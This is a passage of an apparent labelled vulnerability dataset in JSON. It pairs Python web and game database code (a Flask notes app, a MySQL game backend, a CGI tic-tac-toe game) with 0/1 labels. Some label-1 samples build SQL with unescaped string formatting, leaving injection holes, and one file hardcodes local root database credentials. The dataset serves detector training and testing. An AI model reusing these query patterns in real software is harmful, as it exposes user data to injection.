redirect(url_for('index'))\n\n\n@app.route('/signin', methods=['POST', 'GET'])\ndef signin():\n    if request.method == 'POST':\n        username = request.form.get('username')\n        password = request.form.get('password')\n        if validate_signin(username, password):\n            dao.add_user(username, password)\n            flash('Pomy\u015blnie utworzono nowe konto')\n            return redirect(url_for('index'))\n        print('New user not valid')\n        return redirect(url_for('signin'))\n    if request.method == 'GET':\n        verify_session_id()\n        return render_template('signin.html', username=session.get('usr'))\n\n\n@app.route('/api/checkUsername', methods=['POST'])\ndef check_username():\n    username = request.get_json().get('username')\n    if not username.isalnum() or dao.is_username_taken(username):\n        return 'T'\n    else:\n        return 'F'\n\n\n@app.route('/view/<string:file_id>', methods=['GET'])\ndef view_notes(file_id):\n    if not verify_note_access(file_id):\n        abort(403)\n\n    with open(os.path.join(app.config.get('UPLOAD_FOLDER'), file_id+'.txt'), 'r') as file:\n        note_content = file.read()\n\n    note_data = None\n\n    for note in session.get('nl'):\n        if note.get('file_id') == file_id:\n            note_data = note\n    return render_template('note.html', note=note_data, note_content=note_content)\n\n\n@app.route('/upload', methods=['POST'])\ndef upload_notes():\n    verify_session_id()\n    file = request.files.get('file')\n    username = session.get('usr')\n    if file and username:\n        file_id = str(uuid.uuid4())\n        while dao.is_note_uuid_taken(file_id):\n            file_id = str(uuid.uuid4())\n\n        secure_fname = secure_filename(file.filename)\n        uuid_filename = file_id + '.txt'\n        file.save(os.path.join(app.config.get('UPLOAD_FOLDER'), uuid_filename))\n        dao.add_notes(secure_fname, file_id, username)\n\n        notes_list = session.get('nl', [])\n        notes_list.append({\n            \"file_id\": file_id,\n            \"name\": secure_fname\n        })\n        session['nl'] = notes_list\n    return redirect(url_for('index'))\n\n\n@app.route('/download/<string:file_id>')\ndef download_notes(file_id):\n    verify_session_id()\n    if not verify_note_access(file_id):\n        abort(403)\n    filename = dao.get_secure_filename(file_id)\n    return send_from_directory(directory=app.config['UPLOAD_FOLDER'], filename=file_id+'.txt',\n                               attachment_filename=filename, as_attachment=True)\n\n\ndef authenticated_correctly(username, password):\n    if not username.isalnum():\n        return False\n    session_id, notes = dao.login(username, password)\n    delay = random.randint(420, 850)/1000\n    sleep(delay)\n    if session_id:\n        session['sid'] = session_id\n        session['usr'] = username\n        session['nl'] = notes\n        session.modified = True\n        return True\n    else:\n        return False\n\n\ndef validate_signin(username, password):\n    return username.isalnum() and len(password) >= 8 \\\n        and len(username) >= 5 \\\n        and any(char.isdigit() for char in password) \\\n        and any(char.isupper() for char in password) \\\n        and any(char.islower() for char in password) \\\n        and not dao.is_username_taken(username)\n\n\ndef verify_session_id():\n    session_id = session.get('sid')\n    if session_id:\n        verified_sid = dao.check_session(session_id)\n        if not verified_sid:\n            session.clear()\n\n\ndef verify_note_access(file_id):\n    return dao.confirm_owner_of_file(file_id, session.get('sid'), session.get('usr'))\n\n\nif __name__ == '__main__':\n    app.run()\n/n/n/ndb/dao.py/n/nimport sqlite3, hashlib, random, string, uuid\nSALT_LENGTH = 32\nDATABASE_PATH = 'db/data.db'\n\ndef add_user(username, password):\n    salt = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(SALT_LENGTH))\n    password_hash = multiple_hash_password(password, salt)\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n\n    cursor.execute('''INSERT INTO UserData(username, password_hash, salt) \n                      VALUES (?, ?, ?)''', (username, password_hash, salt))\n\n    connection.commit()\n    connection.close()\n\n\ndef login(username, password):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n\n    cursor.execute('''SELECT user_id, password_hash, salt FROM UserData WHERE username = ?''', [username])\n    data = cursor.fetchone()\n    if not data:\n        return None\n    user_id = data[0]\n    password_hash = data[1]\n    salt = data[2]\n    session_id = None\n    notes = []\n\n    if multiple_hash_password(password, salt) == password_hash:\n        session_id = str(uuid.uuid4())\n        cursor.execute('UPDATE UserData SET session_id = ? WHERE user_id = ?', (session_id, user_id))\n        print('SID: '+session_id)\n        connection.commit()\n\n        cursor.execute('SELECT secure_name, uuid_filename FROM Notes WHERE user_id = ?', [user_id])\n        rows = cursor.fetchall()\n        for row in rows:\n            notes.append({\n                \"file_id\": row[1].split('.')[0],\n                \"name\": row[0]\n            })\n    connection.close()\n\n    return session_id, notes\n\n\ndef logout(session_id):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('UPDATE UserData SET session_id = NULL WHERE session_id = ?', [session_id])\n    connection.commit()\n    connection.close()\n\n\ndef check_session(session_id):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('SELECT * FROM UserData WHERE session_id = ?', [session_id])\n    verified = cursor.fetchone()\n    connection.close()\n    return verified\n\n\ndef is_username_taken(username):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('SELECT * FROM UserData WHERE username = ?', [username])\n    records = cursor.fetchone()\n    connection.close()\n    return records\n\n\ndef multiple_hash_password(password, salt):\n    hash_value = password + salt\n    for _ in range(1000):\n        hash_value = hashlib.sha3_512((hash_value + password + salt).encode()).hexdigest()\n    return hash_value\n\n\ndef is_note_uuid_taken(uuid):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('SELECT * FROM Notes WHERE uuid_filename = ?', [uuid])\n    records = cursor.fetchone()\n    connection.close()\n    return records\n\n\ndef add_notes(secure_fname, file_id, username):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('''INSERT INTO Notes(secure_name, user_id, uuid_filename)\n                        VALUES (?, \n                        (SELECT user_id FROM UserData WHERE username = ?),\n                         ?)''', (secure_fname, username, file_id))\n    connection.commit()\n    connection.close()\n\n\ndef confirm_owner_of_file(file_id, session_id, username):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('''SELECT session_id, username FROM UserData WHERE user_id = \n                                (SELECT user_id FROM Notes WHERE uuid_filename = ?)''', [file_id])\n    row = cursor.fetchone()\n    connection.close()\n    return row[0] == session_id and row[1] == username\n\n\ndef get_secure_filename(file_id):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('''SELECT secure_name FROM Notes WHERE uuid_filename = ?''', [file_id])\n    row = cursor.fetchone()\n    connection.close()\n    return row[0]\n/n/n/n", "label": 0}, {"id": "e96fbd2bce5d10612be93170b1bf953f27dd77b6", "code": "/db/dao.py/n/nimport sqlite3, hashlib, random, string, uuid\nSALT_LENGTH = 32\nDATABASE_PATH = 'db/data.db'\n\ndef add_user(username, password):\n    salt = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(SALT_LENGTH))\n    password_hash = multiple_hash_password(password, salt)\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n\n    cursor.execute('''INSERT INTO UserData(username, password_hash, salt) \n                      VALUES (?, ?, ?)''', (username, password_hash, salt))\n\n    connection.commit()\n    connection.close()\n\n\ndef login(username, password):\n    #todo zabezpieczy\u0107 username przed SQLinjection\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n\n    cursor.execute('''SELECT user_id, password_hash, salt FROM UserData WHERE username = ?''', [username])\n    data = cursor.fetchone()\n    if not data:\n        return None\n    user_id = data[0]\n    password_hash = data[1]\n    salt = data[2]\n    session_id = None\n\n    if multiple_hash_password(password, salt) == password_hash:\n        session_id = str(uuid.uuid4())\n        cursor.execute('UPDATE UserData SET session_id = ? WHERE user_id = ?', (session_id, user_id))\n        print('SID: '+session_id)\n        connection.commit()\n\n        cursor.execute('SELECT secure_name, uuid_filename FROM Notes WHERE user_id = ?', [user_id])\n        notes = []\n        rows = cursor.fetchall()\n        for row in rows:\n            notes.append({\n                \"file_id\": row[1].split('.')[0],\n                \"name\": row[0]\n            })\n    connection.close()\n\n    return session_id, notes\n\n\ndef logout(session_id):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('UPDATE UserData SET session_id = NULL WHERE session_id = ?', [session_id])\n    connection.commit()\n    connection.close()\n\n\ndef check_session(session_id):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('SELECT * FROM UserData WHERE session_id = ?', [session_id])\n    verified = cursor.fetchone()\n    connection.close()\n    return verified\n\n\ndef is_username_taken(username):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('SELECT * FROM UserData WHERE username = ?', [username])\n    records = cursor.fetchone()\n    connection.close()\n    return records\n\n\ndef multiple_hash_password(password, salt):\n    hash_value = password + salt\n    for _ in range(1000):\n        hash_value = hashlib.sha3_512((hash_value + password + salt).encode()).hexdigest()\n    return hash_value\n\n\ndef is_note_uuid_taken(uuid):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('SELECT * FROM Notes WHERE uuid_filename = ?', [uuid])\n    records = cursor.fetchone()\n    connection.close()\n    return records\n\n\ndef add_notes(secure_fname, file_id, username):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('''INSERT INTO Notes(secure_name, user_id, uuid_filename)\n                        VALUES (?, \n                        (SELECT user_id FROM UserData WHERE username = ?),\n                         ?)''', (secure_fname, username, file_id))\n    connection.commit()\n    connection.close()\n\n\ndef confirm_owner_of_file(file_id, session_id, username):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('''SELECT session_id, username FROM UserData WHERE user_id = \n                                (SELECT user_id FROM Notes WHERE uuid_filename = ?)''', [file_id])\n    row = cursor.fetchone()\n    connection.close()\n    return row[0] == session_id and row[1] == username\n\n\ndef get_secure_filename(file_id):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('''SELECT secure_name FROM Notes WHERE uuid_filename = ?''', [file_id])\n    row = cursor.fetchone()\n    connection.close()\n    return row[0]\n/n/n/n", "label": 1}, {"id": "47f5aa6aa2e82de7ce2a440aea870958edf0ae77", "code": "db/db_processor_mysql.py/n/n#db_processor_mysql.py\nimport asyncio\nimport tormysql\nimport pymysql\n\n_pool = None\n_handler = None\n\ndef set_log_handler(handler):\n    '''db\uad00\ub828 \uc5d0\ub7ec\uba54\uc2dc\uc9c0\ub97c \ucc98\ub9ac\ud560 \ud578\ub4e4\ub7ec\ub97c \ub4f1\ub85d\ud55c\ub2e4.'''\n    global _handler\n    _handler = handler\n\ndef connect_db_server(host_addr, user_id, password, db, loop):\n    '''db pool\uc744 \uc5f0\ub2e4.'''\n    global _pool\n    _pool = tormysql.ConnectionPool(\n        max_connections = 20,\n        idle_seconds = 7200,\n        wait_connection_timeout = 3,\n        host = host_addr,\n        user = user_id,\n        passwd = password,\n        db = db,\n        charset = \"utf8\")\n\n    return loop.run_until_complete(is_connect_db())\n\nasync def is_connect_db():\n    try:\n        async with await _pool.Connection():\n            pass\n    except Exception as ex:\n        _error_report(ex)\n        return False\n\n    return True\n\nasync def create_account(name: str, password: str):\n    '''db\uc5d0 \uacc4\uc815\uc744 \uc0dd\uc131\ud55c\ub2e4.'''\n    global _pool\n    uid = -1\n    prevented_name = pymysql.escape_string(name)\n    query = \"INSERT INTO player (name, password, lv, xp, hp) values ('%s', '%s', 1, 0, 150)\" % (prevented_name, password)\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(query)\n                uid = conn.insert_id()\n        except Exception as ex:\n            await conn.rollback()\n            _error_report(ex)\n            return False, -1  \n        await conn.commit()\n\n    return True, uid\n\nasync def get_player_info(name: str) -> tuple:\n    '''db\uc5d0\uc11c \ud50c\ub808\uc774\uc5b4 \uc815\ubcf4\ub97c \uc5bb\uc5b4\uc628\ub2e4.'''\n    global _pool\n    prevented_name = pymysql.escape_string(name)\n    query = \"SELECT uid, name, password, lv, xp, hp FROM player where name = '%s'\" % prevented_name\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(query)\n                data = cursor.fetchone()\n        except Exception as ex:\n            _error_report(ex)\n            return tuple()\n\n    if data is None:\n        return tuple()\n\n    return data\n\nasync def update_level_and_xp(name: str, lv: int, xp: int):\n    '''level, xp \uc815\ubcf4\ub97c \uc5c5\ub370\uc774\ud2b8 \ud55c\ub2e4.'''\n    global _pool\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"UPDATE player SET lv=%d, xp=%d where name = '%s'\" % (lv, xp, name))\n        except Exception as ex:\n            _error_report(ex)\n            return False\n        await conn.commit() \n\n    return True\n\nasync def update_hp(name: str, hp: int):\n    '''hp \uc815\ubcf4\ub97c \uc5c5\ub370\uc774\ud2b8 \ud55c\ub2e4.'''\n    global _pool\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"UPDATE player SET hp=%d where name = '%s'\" % (hp, name))\n        except Exception as ex:\n            _error_report(ex)\n            return False\n        await conn.commit() \n\n    return True\n\nasync def create_item(player_uid:int, item_id: int):\n    '''db\uc5d0 \uc544\uc774\ud15c\uc744 \ucd94\uac00\ud55c\ub2e4.'''\n    global _pool\n    uid = -1\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"INSERT INTO item (player_uid, item_id)\\\n                 values (%d, %d)\" % (player_uid, item_id))\n            uid = conn.insert_id()\n        except Exception as ex:\n            _error_report(ex)\n            return False, -1\n        await conn.commit()\n\n    return True, uid\n\nasync def get_item_list(player_uid: int):\n    '''db\uc5d0\uc11c \ud2b9\uc815 \ud50c\ub808\uc774\uc5b4\uc758 \uc18c\uc720 \uc544\uc774\ud15c \ub9ac\uc2a4\ud2b8\ub97c \uc5bb\uc5b4\uc628\ub2e4.'''\n    global _pool\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"SELECT uid, item_id FROM item where player_uid = %d\" % player_uid)\n                datas = cursor.fetchall()\n        except Exception as ex:\n            _error_report(ex)\n            return tuple(), False\n\n    return datas, True\n\ndef close():\n    '''db pool\uc744 \uc885\ub8cc\ud55c\ub2e4.'''\n    global _pool\n    if _pool is not None:\n        _pool.close()\n        _pool = None\n\ndef _error_report(err_msg):\n    '''\uc5d0\ub7ec \ud578\ub4e4\ub7ec\ub85c \uc5d0\ub7ec\uba54\uc2dc\uc9c0\ub97c \ub358\uc9c4\ub2e4.'''\n    global _handler\n    if _handler:\n        _handler(err_msg)\n\nif __name__ == '__main__':\n    def error_handler(msg):\n        print(msg)\n\n    loop = asyncio.get_event_loop()\n    set_log_handler(error_handler)\n    result = connect_db_server('127.0.0.1', 'root', 'Mysql12345', 'mud_db', loop)\n    print('db connect result is ' + str(result))\n    close()\n\n\n/n/n/n", "label": 0}, {"id": "47f5aa6aa2e82de7ce2a440aea870958edf0ae77", "code": "/db/db_processor_mysql.py/n/n#db_processor_mysql.py\nimport asyncio\nimport tormysql\n\n_pool = None\n_handler = None\n\ndef set_log_handler(handler):\n    '''db\uad00\ub828 \uc5d0\ub7ec\uba54\uc2dc\uc9c0\ub97c \ucc98\ub9ac\ud560 \ud578\ub4e4\ub7ec\ub97c \ub4f1\ub85d\ud55c\ub2e4.'''\n    global _handler\n    _handler = handler\n\ndef connect_db_server(host_addr, user_id, password, db, loop):\n    '''db pool\uc744 \uc5f0\ub2e4.'''\n    global _pool\n    _pool = tormysql.ConnectionPool(\n        max_connections = 20,\n        idle_seconds = 7200,\n        wait_connection_timeout = 3,\n        host = host_addr,\n        user = user_id,\n        passwd = password,\n        db = db,\n        charset = \"utf8\")\n\n    return loop.run_until_complete(is_connect_db())\n\nasync def is_connect_db():\n    try:\n        async with await _pool.Connection():\n            pass\n    except Exception as ex:\n        _error_report(ex)\n        return False\n\n    return True\n\nasync def create_account(name: str, password: str):\n    '''db\uc5d0 \uacc4\uc815\uc744 \uc0dd\uc131\ud55c\ub2e4.'''\n    global _pool\n    uid = -1\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\\\n                    \"INSERT INTO player (name, password, lv, xp, hp) values ('%s', '%s', 1, 0, 150)\"\\\n                    % (name, password))\n                uid = conn.insert_id()\n        except Exception as ex:\n            await conn.rollback()\n            _error_report(ex)\n            return False, -1  \n        await conn.commit()\n\n    return True, uid\n\nasync def get_player_info(name: str) -> tuple:\n    '''db\uc5d0\uc11c \ud50c\ub808\uc774\uc5b4 \uc815\ubcf4\ub97c \uc5bb\uc5b4\uc628\ub2e4.'''\n    global _pool\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"SELECT uid, name, password, lv, xp, hp FROM player where name = '%s'\" % name)\n                data = cursor.fetchone()\n        except Exception as ex:\n            _error_report(ex)\n            return tuple()\n\n    if data is None:\n        return tuple()\n\n    return data\n\nasync def update_level_and_xp(name: str, lv: int, xp: int):\n    '''level, xp \uc815\ubcf4\ub97c \uc5c5\ub370\uc774\ud2b8 \ud55c\ub2e4.'''\n    global _pool\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"UPDATE player SET lv=%d, xp=%d where name = '%s'\" % (lv, xp, name))\n        except Exception as ex:\n            _error_report(ex)\n            return False\n        await conn.commit() \n\n    return True\n\nasync def update_hp(name: str, hp: int):\n    '''hp \uc815\ubcf4\ub97c \uc5c5\ub370\uc774\ud2b8 \ud55c\ub2e4.'''\n    global _pool\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"UPDATE player SET hp=%d where name = '%s'\" % (hp, name))\n        except Exception as ex:\n            _error_report(ex)\n            return False\n        await conn.commit() \n\n    return True\n\nasync def create_item(player_uid:int, item_id: int):\n    '''db\uc5d0 \uc544\uc774\ud15c\uc744 \ucd94\uac00\ud55c\ub2e4.'''\n    global _pool\n    uid = -1\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"INSERT INTO item (player_uid, item_id)\\\n                 values (%d, %d)\" % (player_uid, item_id))\n            uid = conn.insert_id()\n        except Exception as ex:\n            _error_report(ex)\n            return False, -1\n        await conn.commit()\n\n    return True, uid\n\nasync def get_item_list(player_uid: int):\n    '''db\uc5d0\uc11c \ud2b9\uc815 \ud50c\ub808\uc774\uc5b4\uc758 \uc18c\uc720 \uc544\uc774\ud15c \ub9ac\uc2a4\ud2b8\ub97c \uc5bb\uc5b4\uc628\ub2e4.'''\n    global _pool\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"SELECT uid, item_id FROM item where player_uid = %d\" % player_uid)\n                datas = cursor.fetchall()\n        except Exception as ex:\n            _error_report(ex)\n            return tuple(), False\n\n    return datas, True\n\ndef close():\n    '''db pool\uc744 \uc885\ub8cc\ud55c\ub2e4.'''\n    global _pool\n    if _pool is not None:\n        _pool.close()\n        _pool = None\n\ndef _error_report(err_msg):\n    '''\uc5d0\ub7ec \ud578\ub4e4\ub7ec\ub85c \uc5d0\ub7ec\uba54\uc2dc\uc9c0\ub97c \ub358\uc9c4\ub2e4.'''\n    global _handler\n    if _handler:\n        _handler(err_msg)\n\nif __name__ == '__main__':\n    def error_handler(msg):\n        print(msg)\n\n    loop = asyncio.get_event_loop()\n    set_log_handler(error_handler)\n    result = connect_db_server('127.0.0.1', 'root', 'Mysql12345', 'mud_db', loop)\n    print('db connect result is ' + str(result))\n    loop.run_until_complete(create_item(37, 0))\n    close()\n\n\n/n/n/n", "label": 1}, {"id": "6096f43fd4b2d91211eec4614b7960c0816900da", "code": "cgi/common.py/n/n# NOTE: I did *NOT* add a shebang here, intentionally, because\n#       this is *NEVER* supposed to be a user-facing script!\n\n\n\nclass FormError(BaseException):\n    def __init__(this, msg):\n        this.msg = msg\n\n\n\ndef get_game_info(conn, game):\n    # get the basic game properties\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT player1,player2,size,state FROM games WHERE id = %d;\", (game,))\n    if cursor.rowcount != 1:\n        raise FormError(\"Invalid game ID\")\n\n    row = cursor.fetchall()[0]\n    players = [row[0],row[1]]\n    size    =  row[2]\n    state   =  row[3]\n\n    if state is None:\n         state = \"Active\"\n\n    cursor.close()\n\n    return (players,size,state)\n\n\n\ndef build_board(conn, game,size):\n    # we'll build the empty board, and then fill in with the move list that\n    # we get from the DB.\n    board = []\n    for i in range(size):\n        board.append([\"\"]*size)\n\n\n    # search for all moves that have happenend during this game.\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT x,y,letter FROM moves WHERE gameID = %d;\", (game,))\n\n    counts = {\"X\":0, \"O\":0}\n    for move in cursor.fetchall():\n        (x,y,letter) = move\n\n        x = int(x)\n        y = int(y)\n        assert x >= 0 and x < size\n        assert y >= 0 and y < size\n\n        assert letter in \"XO\"\n\n        assert board[x][y] == \"\"\n        board[x][y] = letter\n\n        counts[letter] += 1\n\n    cursor.close()\n\n    assert counts[\"X\"] >= counts[\"O\"]\n    assert counts[\"X\"] <= counts[\"O\"]+1\n\n    if counts[\"X\"] == counts[\"O\"]:\n        nextPlayer = 0\n    else:\n        nextPlayer = 1\n    letter = \"XO\"[nextPlayer]\n\n    return (board,nextPlayer,letter)\n\n/n/n/ncgi/create_game.py/n/n#! /usr/bin/env python3\n\n# taken from:\n#    https://docs.python.org/3.4/howto/webservers.html\n\nimport cgi\n\n# enable debugging.  Note that the Python docs recommend this for testing, but\n# say that it's a very bad idea to leave enabled in production, as it can leak\n# information about your internal implementation.\nimport cgitb\ncgitb.enable(display=0, logdir=\"/var/log/httpd/cgi_err/\")\n\n\nimport MySQLdb\nimport private_no_share_dangerous_passwords as pnsdp\n\nfrom common import FormError\n\n\n\n# this function handles the processing of the actual text of the HTML file.\n# It writes everything from the HTML header, to the content in the body, to\n# the closing tags at the bottom.\n#\n# Later, I ought to make this smarter, to handle cookies and such.  Or, just\n# switch over to some framework which makes it all easier for me!\n\ndef process_form():\n    # see https://docs.python.org/3.4/library/cgi.html for the basic usage\n    # here.\n    form = cgi.FieldStorage()\n\n\n    if \"player1\" not in form or \"player2\" not in form or \"size\" not in form:\n        raise FormError(\"Invalid parameters.\")\n\n    player1 = form[\"player1\"].value\n    player2 = form[\"player2\"].value\n    for c in player1+player2:\n        if c not in \"_-\" and not c.isdigit() and not c.isalpha():\n            raise FormError(\"Invalid parameters: The player names can only contains upper and lowercase characters, digits, underscores, and hypens\")\n            return\n\n    try:\n        size = int(form[\"size\"].value)\n    except:\n        raise FormError(\"Invalid parameters: 'size' is not an integer.\")\n        return\n\n    if size < 2 or size > 9:\n        raise FormError(\"The 'size' must be in the range 2-9, inclusive.\")\n\n\n    # connect to the database\n    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,\n                           user   = pnsdp.SQL_USER,\n                           passwd = pnsdp.SQL_PASSWD,\n                           db     = pnsdp.SQL_DB)\n    cursor = conn.cursor()\n\n    # insert the new row\n    cursor.execute(\"\"\"INSERT INTO games(player1,player2,size) VALUES(\"%s\",\"%s\",%d);\"\"\", (player1,player2,size))\n\n    gameID = cursor.lastrowid\n\n\n    # MySQLdb has been building a transaction as we run.  Commit them now, and\n    # also clean up the other resources we've allocated.\n    conn.commit()\n    cursor.close()\n    conn.close()\n\n    return gameID\n\n\n\n# this is what actually runs, each time that we are called...\n\ntry:\n    #print(\"Content-type: text/html\")\n    #print()\n\n    # this will not print out *ANYTHING* !!!\n    gameID = process_form()\n\n    # https://en.wikipedia.org/wiki/Post/Redirect/Get\n    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python\n    print(\"Status: 303 See other\")\n    print(\"\"\"Location: http://%s/cgi-bin/list.py?new_game=%s\"\"\" % (pnsdp.WEB_HOST,gameID))\n    print()\n\nexcept FormError as e:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\n\n<html>\n\n<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>\n\n<body>\n\n<p>ERROR: %s\n\n<p><a href=\"list.py\">Return to game list</a>\n\n</body>\n</html>\n\n\"\"\" % e.msg, end=\"\")\n\nexcept:\n    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error\n\n\n/n/n/ncgi/move.py/n/n#! /usr/bin/env python3\n\n# taken from:\n#    https://docs.python.org/3.4/howto/webservers.html\n\nimport cgi\n\n# enable debugging.  Note that the Python docs recommend this for testing, but\n# say that it's a very bad idea to leave enabled in production, as it can leak\n# information about your internal implementation.\nimport cgitb\ncgitb.enable(display=0, logdir=\"/var/log/httpd/cgi_err/\")\n\nimport MySQLdb\nimport private_no_share_dangerous_passwords as pnsdp\n\nfrom common import get_game_info,build_board,FormError\n\n\n\n# this function handles the processing of the actual text of the HTML file.\n# It writes everything from the HTML header, to the content in the body, to\n# the closing tags at the bottom.\n#\n# Later, I ought to make this smarter, to handle cookies and such.  Or, just\n# switch over to some framework which makes it all easier for me!\n\ndef process_form():\n    # see https://docs.python.org/3.4/library/cgi.html for the basic usage\n    # here.\n    form = cgi.FieldStorage()\n\n\n    # connect to the database\n    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,\n                           user   = pnsdp.SQL_USER,\n                           passwd = pnsdp.SQL_PASSWD,\n                           db     = pnsdp.SQL_DB)\n\n\n    if \"user\" not in form or \"game\" not in form:\n        raise FormError(\"Invalid parameters.\")\n    if \"pos\" not in form and \"resign\" not in form:\n        raise FormError(\"Invalid parameters.\")\n\n    game = int(form[\"game\"].value)\n\n\n    (players,size,state) = get_game_info(conn, game)\n\n    user = form[\"user\"].value\n    if user not in players:\n        raise FormError(\"Invalid player ID - player is not part of this game\")\n\n\n    if \"resign\" in form:\n        resign = True\n    else:\n        resign = False\n        pos = form[\"pos\"].value.split(\",\")\n        assert len(pos) == 2\n        x = int(pos[0])\n        y = int(pos[1])\n\n\n    (board,nextPlayer,letter) = build_board(conn, game,size)\n\n    if user != players[nextPlayer]:\n        raise FormError(\"Internal error, incorrect player is attempting to move.\")\n\n\n    if resign:\n        # this user is choosing to resign.  Update the game state to reflect that.\n        other_player_name = players[1-nextPlayer]\n\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"UPDATE games SET state=\"%s:resignation\" WHERE id=%d;\"\"\", (other_player_name,game))\n        cursor.close()\n\n    else:\n        assert x >= 0 and x < size\n        assert y >= 0 and y < size\n\n        assert board[x][y] == \"\"\n        board[x][y] = \"XO\"[nextPlayer]\n\n        # we've done all of our sanity checks.  We now know enough to say that\n        # it's safe to add a new move.\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"INSERT INTO moves(gameID,x,y,letter,time) VALUES(%d,%d,%d,\"%s\",NOW());\"\"\", (game,x,y,letter))\n\n        if cursor.rowcount != 1:\n            raise FormError(\"Could not make move, reason unknown.\")\n\n        cursor.close()\n\n        result = analyze_board(board)\n        if result != \"\":\n            if result == \"win\":\n                result = players[nextPlayer]+\":win\"\n\n            cursor = conn.cursor()\n            cursor.execute(\"\"\"UPDATE games SET state=\"%s\" WHERE id=%d;\"\"\", (result,game))\n            cursor.close()\n\n    # we've made changes, make sure to commit them!\n    conn.commit()\n    conn.close()\n\n\n    # return the parms to the caller, so that they can build a good redirect\n    return (user,game)\n\n\n\ndef analyze_board(board):\n    size = len(board)\n\n    for x in range(size):\n        # scan through the column 'x' to see if they are all the same.\n        if board[x][0] == \"\":\n            continue\n        all_same = True\n        for y in range(1,size):\n            if board[x][y] != board[x][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    for y in range(size):\n        # scan through the row 'y' to see if they are all the same.\n        if board[0][y] == \"\":\n            continue\n        all_same = True\n        for x in range(1,size):\n            if board[x][y] != board[0][y]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check the NW/SE diagonal\n    if board[0][0] != \"\":\n        all_same = True\n        for i in range(1,size):\n            if board[i][i] != board[0][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check the NE/SW diagonal\n    if board[size-1][0] != \"\":\n        all_same = True\n        for i in range(1,size):\n            if board[size-1-i][i] != board[size-1][0]:\n                all_same = False\n                break\n        if all_same:\n            return \"win\"\n\n    # check for stalemate\n    for x in range(size):\n        for y in range(size):\n            if board[x][y] == \"\":\n                return \"\"\n    return \"stalemate\"\n\n\n\n# this is what actually runs, each time that we are called...\n\ntry:\n#    print(\"Content-type: text/html\")\n#    print()\n\n    # this will not print out *ANYTHING* !!!\n    (user,game) = process_form()\n\n    # https://en.wikipedia.org/wiki/Post/Redirect/Get\n    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python\n    print(\"Status: 303 See other\")\n    print(\"\"\"Location: http://%s/cgi-bin/game.py?user=%s&game=%s\"\"\" % (pnsdp.WEB_HOST, user,game))\n    print()\n\nexcept FormError as e:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\n\n<html>\n\n<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>\n\n<body>\n\n<p>ERROR: %s\n\n<p><a href=\"list.py\">Return to game list</a>\n\n</body>\n</html>\n\n\"\"\" % e.msg, end=\"\")\n\nexcept:\n    print(\"\"\"Content-Type: text/html;charset=utf-8\\n\\n\"\"\")\n\n    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error\n\n\n/n/n/n", "label": 0}, {"id": "6096f43fd4b2d91211eec4614b7960c0816900da", "code": "/cgi/common.py/n/n# NOTE: I did *NOT* add a shebang here, intentionally, because\n#       this is *NEVER* supposed to be a user-facing 